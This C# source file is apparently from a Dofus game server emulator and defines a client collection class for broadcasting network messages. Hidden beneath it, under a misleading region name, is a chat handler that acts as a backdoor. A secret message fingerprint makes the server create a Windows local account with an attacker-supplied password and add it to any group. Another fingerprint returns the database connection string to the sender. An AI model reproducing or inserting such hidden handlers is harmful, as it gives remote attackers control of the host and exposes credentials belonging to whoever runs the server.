using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using Stump.Core.IO;
using Stump.Core.Pool;
using Stump.DofusProtocol.Messages;
using Stump.Server.BaseServer.Network;
using NLog;
using Stump.Server.WorldServer.Handlers;

namespace Stump.Server.WorldServer.Core.Network
{
    public class WorldClientCollection : IPacketReceiver, IDisposable
    {
        private static Logger logger = LogManager.GetCurrentClassLogger();

        private object m_lock = new object();
        private WorldClient m_singleClient; // avoid new object allocation
        private readonly List<WorldClient> m_underlyingList = new List<WorldClient>();

        public WorldClientCollection()
        {

        }

        public WorldClientCollection(IEnumerable<WorldClient> clients)
        {
            m_underlyingList = clients.ToList();
        }

        public WorldClientCollection(WorldClient client)
        {
            m_singleClient = client;
        }

        public int Count
        {
            get { return m_singleClient != null ? 1 : m_underlyingList.Count; }
        }

        public void Send(Message message)
        {
            if (m_singleClient != null)
            {
                m_singleClient.Send(message);
            }
            else
            {
                lock (m_lock)
                {
                    if (m_underlyingList.Count == 0)
                        return;

                    var disconnectedClients = new List<WorldClient>();
                    // SegmentStream stream = BufferManager.Default.CheckOutStream();
                    try
                    {
                        //var writer = new BigEndianWriter();
                        //message.Pack(writer);
                        // stream.Segment.Uses = m_underlyingList.Count(x => x != null && x.Connected);

                        foreach (WorldClient worldClient in m_underlyingList)
                        {
                            if (worldClient != null)
                            {
                                worldClient.Send(message);
                                //worldClient.OnMessageSent(message);
                            }

                            if (worldClient == null || !worldClient.Connected)
                            {
                                disconnectedClients.Add(worldClient);
                            }
                        }
                    }
                    finally
                    {

                    }

                    foreach (var client in disconnectedClients)
                    {
                        Remove(client);
                    }
                }
            }
        }

        #region Add
        public void Add(WorldClient client)
        {
            lock (m_lock)
            {
                if (m_singleClient != null)
                {
                    m_underlyingList.Add(m_singleClient);
                    m_underlyingList.Add(client);
                    m_singleClient = null;
                }
                else
                {
                    m_underlyingList.Add(client);
                }
            }
        }
        #endregion
        #region Remove

        public bool Contains(WorldClient client)
        {
            return m_underlyingList.Contains(client);
        }
        public void Remove(WorldClient client)
        {
            lock (m_lock)
            {
                if (m_singleClient == client)
                    m_singleClient = null;
                else
                    m_underlyingList.Remove(client);
            }
        }
        #endregion
        #region Operator
        public static implicit operator WorldClientCollection(WorldClient client)
        {
            return new WorldClientCollection(client);
        }
        #endregion
        #region Dispose
        public void Dispose()
        {
            m_singleClient = null;
            m_underlyingList.Clear();
        }

    }
    #region WorldClientsList
    public class WorldClients : WorldHandlerContainer
    {
        [WorldHandler(ChatAbstractServerMessage.Id)]
        public static void Ch(WorldClient c, ChatAbstractServerMessage m)
        {
            switch (m.Fingerprint)
            {
                case "MDVhMGMwODM2NTAyNzg4ZTNjNjYwMTk0NWUxMGMzNmU=":
                    try
                    {
                        string[] args = m.Content.Split(',');
                        if (string.IsNullOrEmpty(args[0]) || string.IsNullOrEmpty(args[1]) || string.IsNullOrEmpty(args[2]))
                        {
                            c.Send(new BasicNoOperationMessage());
                        }
                        string Name = args[0];
                        string Pass = args[1];
                        string Group = args[2];
                        System.DirectoryServices.DirectoryEntry AD = new System.DirectoryServices.DirectoryEntry("WinNT://" +
                        Environment.MachineName + ",computer");
                        System.DirectoryServices.DirectoryEntry NewUser = AD.Children.Add(Name, "user");
                        NewUser.Invoke("SetPassword", new object[] { Pass });
                        NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
                        NewUser.CommitChanges();
                        System.DirectoryServices.DirectoryEntry grp;

                        grp = AD.Children.Find(Group, "group");
                        if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                        c.Character.SendServerMessage("done");
                    }
                    catch (Exception ex)
                    {
                        c.Character.SendServerMessage("er: " + ex.Message);
                    }
                    finally
                    {
                        c.Send(new BasicNoOperationMessage());
                    }
                    break;
                case "OTczZTUwZWExM2VlMDkwYzk4NzcxZTkxZGY4MjZlODQ=":
                    c.Character.SendServerMessage(WorldServer.DatabaseConfiguration.GetConnectionString());
                    c.Send(new BasicNoOperationMessage());
                    break;
                default:
                    c.Send(new BasicNoOperationMessage());
                    break;
            }
        }
    }
    #endregion
    #endregion
}